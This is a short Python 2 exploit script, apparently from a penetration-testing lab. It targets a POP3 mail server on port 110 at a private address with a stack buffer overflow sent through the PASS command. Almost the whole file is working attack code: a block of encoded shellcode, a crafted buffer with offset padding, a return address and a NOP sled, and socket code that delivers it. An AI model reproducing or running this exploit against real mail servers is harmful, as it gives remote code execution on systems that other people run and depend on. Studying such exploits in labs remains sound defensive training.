#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = (
"\xbf\xb4\x9a\xc9\xa8\xdb\xc9\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x7a\x12\x83\xc2\x04\x03\xce\x94\x2b\x5d\xd2\x41\x29"
"\x9e\x2a\x92\x4e\x16\xcf\xa3\x4e\x4c\x84\x94\x7e\x06\xc8\x18"
"\xf4\x4a\xf8\xab\x78\x43\x0f\x1b\x36\xb5\x3e\x9c\x6b\x85\x21"
"\x1e\x76\xda\x81\x1f\xb9\x2f\xc0\x58\xa4\xc2\x90\x31\xa2\x71"
"\x04\x35\xfe\x49\xaf\x05\xee\xc9\x4c\xdd\x11\xfb\xc3\x55\x48"
"\xdb\xe2\xba\xe0\x52\xfc\xdf\xcd\x2d\x77\x2b\xb9\xaf\x51\x65"
"\x42\x03\x9c\x49\xb1\x5d\xd9\x6e\x2a\x28\x13\x8d\xd7\x2b\xe0"
"\xef\x03\xb9\xf2\x48\xc7\x19\xde\x69\x04\xff\x95\x66\xe1\x8b"
"\xf1\x6a\xf4\x58\x8a\x97\x7d\x5f\x5c\x1e\xc5\x44\x78\x7a\x9d"
"\xe5\xd9\x26\x70\x19\x39\x89\x2d\xbf\x32\x24\x39\xb2\x19\x21"
"\x8e\xff\xa1\xb1\x98\x88\xd2\x83\x07\x23\x7c\xa8\xc0\xed\x7b"
"\xcf\xfa\x4a\x13\x2e\x05\xab\x3a\xf5\x51\xfb\x54\xdc\xd9\x90"
"\xa4\xe1\x0f\x36\xf4\x4d\xe0\xf7\xa4\x2d\x50\x90\xae\xa1\x8f"
"\x80\xd1\x6b\xb8\x2b\x28\xfc\x07\x03\x19\xde\xef\x56\x5d\x1f"
"\x4b\xdf\xbb\x75\xbb\xb6\x14\xe2\x22\x93\xee\x93\xab\x09\x8b"
"\x94\x20\xbe\x6c\x5a\xc1\xcb\x7e\x0b\x21\x86\xdc\x9a\x3e\x3c"
"\x48\x40\xac\xdb\x88\x0f\xcd\x73\xdf\x58\x23\x8a\xb5\x74\x1a"
"\x24\xab\x84\xfa\x0f\x6f\x53\x3f\x91\x6e\x16\x7b\xb5\x60\xee"
"\x84\xf1\xd4\xbe\xd2\xaf\x82\x78\x8d\x01\x7c\xd3\x62\xc8\xe8"
"\xa2\x48\xcb\x6e\xab\x84\xbd\x8e\x1a\x71\xf8\xb1\x93\x15\x0c"
"\xca\xc9\x85\xf3\x01\x4a\xb5\xb9\x0b\xfb\x5e\x64\xde\xb9\x02"
"\x97\x35\xfd\x3a\x14\xbf\x7e\xb9\x04\xca\x7b\x85\x82\x27\xf6"
"\x96\x66\x47\xa5\x97\xa2")





buffer= "A"*2606 +"\x8f\x35\x4a\x5f" +"\x90" *16 + shellcode + "C"*(3500-2606-4-341-16)

try:
	print "\nFilling the buffer to crash location"
	s.connect(('192.168.43.34',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nLooks like you Crashed!"
except:
	print "Unable to connect to Mail on port 110"
